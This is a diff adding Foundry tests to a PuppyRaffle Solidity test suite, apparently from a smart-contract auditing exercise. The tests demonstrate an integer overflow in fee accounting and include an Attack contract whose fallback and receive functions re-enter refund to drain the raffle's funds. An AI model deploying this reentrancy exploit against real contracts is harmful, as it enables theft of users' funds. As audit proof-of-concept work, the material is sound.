@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: MIT
-pragma solidity 0.8.19;
+pragma solidity ^0.7.6;
 pragma experimental ABIEncoderV2;
 
 import {Test, console} from "forge-std/Test.sol";
@@ -233,5 +233,112 @@ contract PuppyRaffleTest is Test {
         puppyRaffle.selectWinner();
         puppyRaffle.withdrawFees();
         assertEq(address(feeAddress).balance, expectedPrizeAmount);
+    }
+
+    function test_reentrancyRefund() public playerEntered {
+        uint256 balanceBefore = address(playerOne).balance;
+        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);
+        vm.prank(playerOne);
+        puppyRaffle.refund(indexOfPlayer);
+        assertEq(address(playerOne).balance, balanceBefore + entranceFee);
+    }
+
+    function test_RentrancyRefund() public payable {
+        address[] memory players = new address[](4);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        players[2] = playerThree;
+        players[3] = playerFour;
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+
+        Attack attack_contract = new Attack(puppyRaffle);
+        address attacker = makeAddr("attacker");
+        vm.deal(attacker, 1 ether);
+        uint256 startingContractBalance = address(puppyRaffle).balance;
+        uint256 startingAttackContractBalance = address(attack_contract)
+            .balance;
+
+        vm.prank(attacker);
+        attack_contract.attack{value: entranceFee}();
+
+        console.log(
+            "Starting attack contract balance ",
+            startingAttackContractBalance
+        );
+        console.log("Starting contract balance ", startingContractBalance);
+        console.log("Ending contract balance ", address(puppyRaffle).balance);
+        console.log(
+            "Ending attack contract balance",
+            address(attack_contract).balance
+        );
+    }
+
+    function testTotalFeesOverflow() public playersEntered {
+        // We finish a raffle of 4 to collect some fees
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+        puppyRaffle.selectWinner();
+        uint256 startingTotalFees = puppyRaffle.totalFees();
+        console.log("starting total fess",startingTotalFees);
+
+        // startingTotalFees = 800000000000000000
+
+        // We then have 89 players enter a new raffle
+        uint256 playersNum = 89;
+        address[] memory players = new address[](playersNum);
+        for (uint256 i = 0; i < playersNum; i++) {
+            players[i] = address(i);
+        }
+        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
+        // We end the raffle
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+
+        // And here is where the issue occurs
+        // We will now have fewer fees even though we just finished a second raffle
+        puppyRaffle.selectWinner();
+
+        uint256 endingTotalFees = puppyRaffle.totalFees();
+        console.log("ending total fees", endingTotalFees);
+        console.log("contract balance ",address(puppyRaffle).balance);
+        assert(endingTotalFees < startingTotalFees);
+
+        // We are also unable to withdraw any fees because of the require check
+        vm.prank(puppyRaffle.feeAddress());
+        vm.expectRevert("PuppyRaffle: There are currently players active!");
+        puppyRaffle.withdrawFees();
+    }
+}
+
+contract Attack {
+    PuppyRaffle puppy_raffle;
+    uint256 _entraceFee;
+
+    constructor(PuppyRaffle _puppy_raffle) {
+        puppy_raffle = _puppy_raffle;
+        _entraceFee = puppy_raffle.entranceFee();
+    }
+
+    function attack() external payable {
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+        puppy_raffle.enterRaffle{value: _entraceFee}(players);
+        uint256 _index = puppy_raffle.getActivePlayerIndex(address(this));
+        puppy_raffle.refund(_index);
+    }
+
+    function stealMoney() internal {
+        uint256 _index = puppy_raffle.getActivePlayerIndex(address(this));
+        if (address(puppy_raffle).balance >= _entraceFee) {
+            puppy_raffle.refund(_index);
+        }
+    }
+
+    fallback() external payable {
+        stealMoney();
+    }
+
+    receive() external payable {
+        stealMoney();
     }
 }
